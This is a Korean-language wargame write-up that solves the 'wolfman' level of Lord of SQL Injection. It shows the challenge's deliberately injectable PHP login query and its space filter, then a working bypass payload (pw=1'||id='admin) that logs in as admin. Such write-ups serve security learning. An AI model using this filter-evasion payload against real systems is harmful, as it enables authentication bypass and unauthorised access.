---
title: "[Lord of SQL Injection] LoS - wolfman 문제풀이"
date: 2018-07-24
draft: false
category: [wargame]
subcategories: [lord-of-sql-injection]
tags: [Write-up, Lord of SQL Injection]
---

드디어 첫 줄의 마지막 문제인 `wolfman` 문제이다.
이번에는 `Blind SQL Injection`이 아니다.  

<!--more-->

코드는 다음과 같다.  

```php
-------------------------------------------------------------------------------------
query : select id from prob_wolfman where id='guest' and pw=''
-------------------------------------------------------------------------------------

<?php 
  include "./config.php"; 
  login_chk(); 
  dbconnect(); 
  if(preg_match('/prob|_|\.|\(\)/i', $_GET[pw])) exit("No Hack ~_~"); 
  if(preg_match('/ /i', $_GET[pw])) exit("No whitespace ~_~"); 
  $query = "select id from prob_wolfman where id='guest' and pw='{$_GET[pw]}'"; 
  echo "<hr>query : <strong>{$query}</strong><hr><br>"; 
  $result = @mysql_fetch_array(mysql_query($query)); 
  if($result['id']) echo "<h2>Hello {$result[id]}</h2>"; 
  if($result['id'] == 'admin') solve("wolfman"); 
  highlight_file(__FILE__); 
?>
```

첨엔 이 전에 나왔던 문제랑 뭐가 다른건가 했는데 이제보니 `공백`에 대한 필터링이 추가되어 있다.
당연한 얘기지만 이 경우 이 전 문제들을 풀었던 것 처럼 `1' or id='admin`을 사용할 수 없다.

그래서 이번에는 `or`이라는 문자열 대신에 `||`을 사용했다.
`or`을 사용 할 경우에는 `or id='admin` 처럼 무조건 공백이 들어가야 하지만, `||`는 공백 없이 `||id='admin`을 해도 잘 동작하기 때문이다.
문제를 풀기 위해 아래와 같이 입력 해 보았다.  

```plain
?pw=1'||id='admin
```

역시 문제를 풀 수 있었다.  

```php
-----------------------------------------------------------------------------------------------------
query : select id from prob_wolfman where id='guest' and pw='1'||id='admin'
-----------------------------------------------------------------------------------------------------

Hello admin
WOLFMAN Clear!
<?php 
  include "./config.php"; 
  login_chk(); 
  dbconnect(); 
  if(preg_match('/prob|_|\.|\(\)/i', $_GET[pw])) exit("No Hack ~_~"); 
  if(preg_match('/ /i', $_GET[pw])) exit("No whitespace ~_~"); 
  $query = "select id from prob_wolfman where id='guest' and pw='{$_GET[pw]}'"; 
  echo "<hr>query : <strong>{$query}</strong><hr><br>"; 
  $result = @mysql_fetch_array(mysql_query($query)); 
  if($result['id']) echo "<h2>Hello {$result[id]}</h2>"; 
  if($result['id'] == 'admin') solve("wolfman"); 
  highlight_file(__FILE__); 
?>
```

---

```plain
WOLFMAN Clear!!
```